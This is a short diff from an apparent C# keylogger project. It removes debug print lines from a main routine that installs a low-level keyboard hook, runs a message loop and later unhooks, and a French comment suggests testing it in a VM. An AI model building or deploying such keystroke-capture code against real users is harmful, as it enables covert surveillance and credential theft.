@@ -68,13 +68,13 @@ namespace Keylog
         static void Main(string[] args)
         {
             string name = getName();
-            Console.WriteLine("1");
+            
             Keylog_exe kl = new Keylog_exe(name);
-            Console.WriteLine("2");
+            
             hook = Keylog_exe.SetHook(Keylog_exe.llkProcedure);
-            Console.WriteLine("3");
+            
             System.Windows.Forms.Application.Run();
-            Console.WriteLine("4");
+            
             Keylog_exe.UnhookWindowsHookEx(hook); // permet d'enlever le keylogger, peut a essayer sur une vm
         }
 
